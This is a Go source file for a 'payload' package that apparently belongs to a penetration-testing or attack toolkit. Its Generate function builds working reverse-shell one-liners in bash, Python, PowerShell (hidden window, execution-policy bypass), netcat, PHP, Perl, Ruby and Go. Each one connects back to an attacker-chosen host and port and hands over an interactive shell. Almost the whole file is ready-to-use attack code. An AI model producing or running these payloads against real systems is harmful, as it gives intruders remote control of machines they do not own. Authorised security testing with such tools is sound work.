// Package payload generates reverse-shell one-liners matching the Python
// PayloadGenerator from core/reverse_shell.py.
package payload

import (
	"fmt"
	"strings"
)

// Generator mirrors Python's PayloadGenerator.generate().
type Generator struct{}

// NewGenerator returns a ready-to-use Generator.
func NewGenerator() *Generator { return &Generator{} }

// Generate returns a reverse-shell one-liner for the given type and target.
// Types: bash, bash_tcp, python, python3, powershell, pwsh, nc, php, perl, ruby, go
func (g *Generator) Generate(ptype, lhost string, lport int) (string, error) {
	switch strings.ToLower(ptype) {
	case "bash", "bash_tcp":
		return fmt.Sprintf("bash -i >& /dev/tcp/%s/%d 0>&1", lhost, lport), nil
	case "python":
		return fmt.Sprintf(
			`python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("%s",%d));`+
				`os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);`+
				`subprocess.call(["/bin/bash","-i"])'`, lhost, lport), nil
	case "python3":
		return fmt.Sprintf(
			`python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("%s",%d));`+
				`os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);`+
				`subprocess.call(["/bin/bash","-i"])'`, lhost, lport), nil
	case "powershell", "pwsh":
		return fmt.Sprintf(
			`powershell -NoP -NonI -W Hidden -Exec Bypass -Command `+
				`"$c=New-Object System.Net.Sockets.TCPClient('%s',%d);`+
				`$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};`+
				`while(($i=$s.Read($b,0,$b.Length))-ne0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);`+
				`$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';`+
				`$sb=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"`,
			lhost, lport), nil
	case "nc":
		return fmt.Sprintf("nc -e /bin/bash %s %d", lhost, lport), nil
	case "php":
		return fmt.Sprintf(
			`php -r '$s=fsockopen("%s",%d);exec("/bin/bash -i <&3 >&3 2>&3");'`,
			lhost, lport), nil
	case "perl":
		return fmt.Sprintf(
			`perl -e 'use Socket;$i="%s";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));`+
				`connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");`+
				`open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'`,
			lhost, lport), nil
	case "ruby":
		return fmt.Sprintf(
			`ruby -rsocket -e 'f=TCPSocket.open("%s",%d).to_i;`+
				`exec sprintf("/bin/bash -i <&%%d >&%%d 2>&%%d",f,f,f)'`,
			lhost, lport), nil
	case "go":
		return fmt.Sprintf(
			`echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","%s:%d");`+
				`cmd:=exec.Command("/bin/bash");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}'`+
				`> /tmp/s.go && go run /tmp/s.go`, lhost, lport), nil
	default:
		return "", fmt.Errorf("unsupported payload type: %q", ptype)
	}
}

// Types returns the list of supported payload types.
func (g *Generator) Types() []string {
	return []string{"bash", "bash_tcp", "python", "python3", "powershell", "pwsh",
		"nc", "php", "perl", "ruby", "go"}
}
